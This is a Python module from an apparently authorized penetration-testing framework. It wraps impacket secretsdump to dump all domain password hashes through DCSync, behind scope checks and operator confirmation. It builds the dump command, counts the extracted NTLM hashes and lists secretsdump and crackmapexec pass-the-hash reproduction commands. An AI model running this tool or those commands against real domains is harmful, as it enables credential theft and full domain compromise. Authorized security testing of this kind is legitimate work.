"""Secrets dump — extract NTDS.dit and SAM hashes via impacket secretsdump."""
from __future__ import annotations

import asyncio
import shutil
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_SECRETSDUMP = "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"
CVSS40_SECRETSDUMP = "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
class Secretsdump(BaseModule):
    """Domain secrets extraction via impacket secretsdump."""

    NAME        = "secretsdump"
    DESCRIPTION = "Extract all domain password hashes via DCSync or NTDS.dit dump"
    PHASE       = 13
    TAGS        = ["post", "dcsync", "secretsdump", "hashes", "mitre-T1003.003"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Require --dcsync flag
        if not self.config.extra.get("dcsync_enabled", False):
            self.log.info("DCSync not enabled — use --dcsync flag to enable. Skipping.")
            return self._make_result(start, skipped=True, skip_reason="--dcsync not set")

        confirmed = self.confirm_action(
            module=self.NAME,
            action=f"Run secretsdump (DCSync) against {domain} @ {dc_ip} — extracts ALL domain hashes",
            target=dc_ip,
            risk=(
                "CRITICAL: This extracts ALL password hashes from the domain. "
                "Generates significant AD replication traffic. "
                "Only authorized in full-compromise scope engagements."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        hashes_dir = Path(self.config.extra.get("results_dir", "/tmp")) / "hashes"
        hashes_dir.mkdir(parents=True, exist_ok=True)
        output_file = str(hashes_dir / "secretsdump_output")

        await self._run_secretsdump(domain, dc_ip, output_file)
        return self._make_result(start)

    async def _run_secretsdump(self, domain: str, dc_ip: str, output_file: str) -> None:
        script = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
        if not script:
            self.log.warning("secretsdump.py not found — install impacket")
            return

        username = self.config.extra.get("username", "")
        password = self.config.extra.get("password", "")
        nt_hash  = self.config.extra.get("hash", "")

        if nt_hash:
            target_str = f"{domain}/{username}@{dc_ip}"
            cmd = [script, "-hashes", f":{nt_hash}", "-dc-ip", dc_ip,
                   "-outputfile", output_file, target_str]
        else:
            target_str = f"{domain}/{username}:{password}@{dc_ip}"
            cmd = [script, "-dc-ip", dc_ip, "-outputfile", output_file, target_str]

        try:
            self.log.info("Running secretsdump against %s", dc_ip)
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
            output = stdout.decode() + stderr.decode()

            # Count hashes
            ntds_file = Path(output_file + ".ntds")
            hash_count = 0
            if ntds_file.exists():
                hash_count = sum(1 for line in ntds_file.read_text().splitlines()
                                 if ":::" in line)

            if hash_count > 0 or "Administrator" in output:
                ev = Evidence(
                    extra={
                        "dc_ip":       dc_ip,
                        "hash_count":  hash_count,
                        "output_file": output_file,
                    }
                )
                self.new_finding(
                    title=f"DCSync/NTDS Dump Successful — {hash_count} Hash(es) Extracted",
                    severity=Severity.CRITICAL,
                    description=(
                        f"secretsdump successfully extracted {hash_count} NTLM hash(es) "
                        f"from {dc_ip}. "
                        "Hashes saved to: " + output_file + "\n"
                        "Use: pass-the-hash, hashcat for offline cracking."
                    ),
                    reproduction_steps=[
                        f"secretsdump.py {domain}/{username}@{dc_ip} -outputfile hashes",
                        "crackmapexec smb <target> -u Administrator -H <nthash>",
                    ],
                    remediation=(
                        "Rotate ALL domain passwords immediately. "
                        "Rotate KRBTGT twice (with 10hr interval to invalidate golden tickets). "
                        "Implement tiered administration. Enable Protected Users group."
                    ),
                    references=["MITRE T1003.003", "CVE-2020-1472 (related)"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_SECRETSDUMP,
                    cvss_v40_vector=CVSS40_SECRETSDUMP,
                    mitre_attack=["TA0006/T1003.003"],
                    target=dc_ip,
                    operator_confirmed=True,
                )
            else:
                self.log.warning("secretsdump may have failed: %s", output[:200])

        except asyncio.TimeoutError:
            self.log.warning("secretsdump timed out after 300s")
        except Exception as exc:
            self.log.error("secretsdump failed: %s", exc)


class TestSecretsdump:
    def test_cvss_vector(self) -> None:
        assert CVSS_SECRETSDUMP.startswith("CVSS:3.1")
